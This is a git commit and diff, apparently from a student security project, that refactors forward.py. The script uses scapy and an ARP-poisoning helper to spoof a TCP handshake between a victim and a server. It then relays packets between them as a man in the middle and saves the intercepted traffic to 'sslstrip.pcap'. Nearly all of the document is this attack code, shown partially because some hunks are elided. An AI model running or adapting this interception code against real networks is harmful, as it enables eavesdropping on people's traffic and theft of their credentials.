361d9a2c1b86fa0d35788f05681ce39fb15f5c05
Geert van Wordragen <g.c.v.wordragen@student.tue.nl>
2019-04-09 12:09:48 +0200

    Cleaned up forward.py code

--- forward.py
+++ forward.py
@@ -1,20 +1,15 @@
 from scapy.all import *
 from arppoison import gethostmac
 
-def forward(p):
+def forward(p, ipToSpoof, ipVictim, ipLayerS, ipLayerC, ifa):
     if p[IP].src == ipToSpoof:
-        send(ipLayerC / p[TCP], iface = ifa)
+        send(ipLayerC / p[TCP], iface = ifa, verbose = False)
     elif p[IP].src == ipVictim:
-        send(ipLayerS / p[TCP], iface = ifa)
+        send(ipLayerS / p[TCP], iface = ifa, verbose = False)
     return p.summary()
-
-def isnotownpacket(p):
-    return p[Ether].src != attackerMac
         
-def startforwarding(ipServer, ifa, timeOut):
-    global ipToSpoof, ipVictim, ipLayerS, ipLayerC, attackerMac
+def startforwarding(ipToSpoof, ifa, timeOut):
     attackerMac = gethostmac(ifa)
-    ipToSpoof = ipServer
     print "Listening as " + ipToSpoof
 
     # SYN from client
@@ -26,7 +21,7 @@ def startforwarding(ipServer, ifa, timeOut):
     # SYN to server
     ipLayerS = IP(src = ipVictim, dst = ipToSpoof)
     tcpLayer = TCP(sport = port, dport = 80, flags = "S", seq = a[0].seq, window = a[0].window)
-    answer = sr1(ipLayerS / tcpLayer, iface = ifa)
+    answer = sr1(ipLayerS / tcpLayer, iface = ifa) # SYNACK from server
 
     # SYNACK to client
     ipLayerC = IP(src = ipToSpoof, dst = ipVictim)
@@ -35,6 +30,8 @@ def startforwarding(ipServer, ifa, timeOut):
     print "Handshake completed"
     print "---------------------"
 
-    packets = sniff(filter = "tcp", lfilter = isnotownpacket, prn = forward, iface = ifa, timeout = timeOut)
+    packets = sniff(filter = "tcp", iface = ifa, timeout = timeOut,
+        lfilter = lambda(p): p[Ether].src != attackerMac,
+        prn = lambda(p): forward(p, ipToSpoof, ipVictim, ipLayerS, ipLayerC, ifa))
     #save sniffed packets
     wrpcap('sslstrip.pcap', packets)
